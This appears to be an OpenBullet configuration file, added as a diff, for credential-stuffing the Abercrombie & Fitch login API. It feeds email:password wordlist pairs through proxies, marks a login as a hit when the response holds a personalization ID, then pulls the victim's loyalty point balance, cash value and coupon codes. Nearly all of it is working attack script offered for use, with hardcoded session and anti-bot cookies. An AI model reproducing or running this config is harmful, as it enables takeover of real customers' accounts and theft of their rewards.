@@ -1,0 +1,50 @@
+[SETTINGS]
+{
+  "Name": "abercrombie",
+  "SuggestedBots": 1,
+  "LastModified": "2019-05-31T13:12:07.4007811+01:00",
+  "AdditionalInfo": "",
+  "Author": "Meowtit",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.abercrombie.com/api/ecomm/a-us/session?rememberMe=true" 
+  CONTENT "{\"logonId\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  COOKIE "dtCookie==3=srv=6=sn=C01CA82461D48F88CC7A2045FE968125=perc=100000=ol=0=mul=1; WC_PERSISTENT=%2FPYkHHt1QvZ6tGiwHLyeX35ieA320W3PtEKbq7UznAo%3D%3B2019-05-31+07%3A05%3A43.244_1559300743244-61445_0; geoLocation=US: NC:28201; ANFSession=100511559300743257; xSeg=b=AO-0&sq=QQ-2; cf659858fe44f7b954e9749467f78c3b=2ebee6cf6c046d8a525ddd4109b4c641; bm_sz=0874E09870A0CE532DD8BE05A87E99CA~YAAQVNPZP1T5CexqAQAAyyCRDQMgtRhFtkw8IfAmoo0uJkz/L74deBrEZ1ivVtKn/8PsTVVurGKtmzkGZcv/5kdZa8FaVPSJJeyXrqfPc7NINrnuD3rbZm8pmYT2mcnuWk63rMAQ2cDrPUkhYTrenc6xEwmHZiHDj4r88/mRxHASWDpLmYGvgrAg08D8cejrHyzFne8=; ak_bmsc=CF51CECA8232A857AE187694472968FD3FD9D3547A650000870AF15C0B58AD05~pl4+oW8a/m02o3kpHqn7mEYu2PbWA7CdyvLchkc9YuRutGCIMC3VkrJYcGQPC1h+FxG4Hzy/q+xeJ7uK/+VWTRQshMv4ZdJm5y6fqZvFb/ocD2mBLZG57U4zUvel8iZQShbM1rR3Wjt6dVL4/U5NfALNPwFUe1LWsHWugJISswOEHaDuFUhygj/LYDt9MuL6yd+DzNW5PixKEniFYjcPXk0olLjepmaWRl9ieVMBIq6e9s7OYQui6k+9JoUM8gyGe/zRQHx9FJT83Jj8Y9z3L8TTKQ6wXVWH2ABHCqwg5S/ABdHNN/ak6pZqbADbDm4drM5HGPeqWNQcQN8cbRBVSvfg==; _abck=84F8A140BF08535BDA2CC153BA500D793FD9D3547A650000870AF15C77240B54~0~K/gCnek6fb0l/sKpdfM3X5kSt7POtNYVoHVfalmRTZQ=~-1~-1; JSESSIONID=0000cl4Up00PuevRDiyp5B9uXc6:-1; 7646bbcf29bb3bc2e80ff21c1326e7fc=f814f8358e5de36a2ab7d06854b58c9f; bm_sv=6029C8835916251D5B88D1FD091B8E37~2BuwYIjlceI4aIHfbQTln1vNIQqEJE967EmPVurWLyojYGzHiKlNdQI2i3IEGQrC5dadtYTdZZ3/K0pPBrGrU16FjTQg/koVQI5gJNn9CZNhgYqRnyitZKQJwMvQkeHjAZQplTlKPTGmGi+Z96/g7Yj6aO9POffM+GpWeQ3Bu1A=; uPref=%7B%22brnd%22%3A%22anf%22%2C%22psid%22%3A%2211640%22%2C%22ssid%22%3A%22%22%7D" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "errorKey\":\"" 
+  KEYCHAIN Success OR 
+    KEY "personalizationID\":\"" 
+REQUEST GET "https://www.abercrombie.com/api/ecomm/a-us/user/loyalty/coupons?version=1.1" 
+  
+  COOKIE "dtCookie==3=srv=6=sn=C01CA82461D48F88CC7A2045FE968125=perc=100000=ol=0=mul=1; WC_PERSISTENT=%2FPYkHHt1QvZ6tGiwHLyeX35ieA320W3PtEKbq7UznAo%3D%3B2019-05-31+07%3A05%3A43.244_1559300743244-61445_0; geoLocation=US: NC:28201; ANFSession=100511559300743257; xSeg=b=AO-0&sq=QQ-2; cf659858fe44f7b954e9749467f78c3b=2ebee6cf6c046d8a525ddd4109b4c641; bm_sz=0874E09870A0CE532DD8BE05A87E99CA~YAAQVNPZP1T5CexqAQAAyyCRDQMgtRhFtkw8IfAmoo0uJkz/L74deBrEZ1ivVtKn/8PsTVVurGKtmzkGZcv/5kdZa8FaVPSJJeyXrqfPc7NINrnuD3rbZm8pmYT2mcnuWk63rMAQ2cDrPUkhYTrenc6xEwmHZiHDj4r88/mRxHASWDpLmYGvgrAg08D8cejrHyzFne8=; ak_bmsc=CF51CECA8232A857AE187694472968FD3FD9D3547A650000870AF15C0B58AD05~pl4+oW8a/m02o3kpHqn7mEYu2PbWA7CdyvLchkc9YuRutGCIMC3VkrJYcGQPC1h+FxG4Hzy/q+xeJ7uK/+VWTRQshMv4ZdJm5y6fqZvFb/ocD2mBLZG57U4zUvel8iZQShbM1rR3Wjt6dVL4/U5NfALNPwFUe1LWsHWugJISswOEHaDuFUhygj/LYDt9MuL6yd+DzNW5PixKEniFYjcPXk0olLjepmaWRl9ieVMBIq6e9s7OYQui6k+9JoUM8gyGe/zRQHx9FJT83Jj8Y9z3L8TTKQ6wXVWH2ABHCqwg5S/ABdHNN/ak6pZqbADbDm4drM5HGPeqWNQcQN8cbRBVSvfg==; _abck=84F8A140BF08535BDA2CC153BA500D793FD9D3547A650000870AF15C77240B54~0~K/gCnek6fb0l/sKpdfM3X5kSt7POtNYVoHVfalmRTZQ=~-1~-1; JSESSIONID=0000cl4Up00PuevRDiyp5B9uXc6:-1; 7646bbcf29bb3bc2e80ff21c1326e7fc=f814f8358e5de36a2ab7d06854b58c9f; bm_sv=6029C8835916251D5B88D1FD091B8E37~2BuwYIjlceI4aIHfbQTln1vNIQqEJE967EmPVurWLyojYGzHiKlNdQI2i3IEGQrC5dadtYTdZZ3/K0pPBrGrU16FjTQg/koVQI5gJNn9CZNhgYqRnyitZKQJwMvQkeHjAZQplTlKPTGmGi+Z96/g7Yj6aO9POffM+GpWeQ3Bu1A=; uPref=%7B%22brnd%22%3A%22anf%22%2C%22psid%22%3A%2211640%22%2C%22ssid%22%3A%22%22%7D" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+#PARSE_pointBalance PARSE "<SOURCE>" LR "pointBalance\":\"" "\"" -> CAP "pointBalance" 
+#PARSE_totalCashValue PARSE "<SOURCE>" LR "totalCashValue\":" ",\"" -> CAP "totalCashValue" 
+#PARSE_coupons PARSE "<SOURCE>" LR "coupons\":[" "],\"" -> CAP "coupons" 
+#PARSE_couponCode PARSE "<SOURCE>" LR "couponCode\":\"" "\"," Recursive=TRUE -> CAP "couponCode" 
+#PARSE_couponExpiryDate PARSE "<SOURCE>" LR "couponExpiryDate\":\"" "\"" -> CAP "couponExpiryDate" 
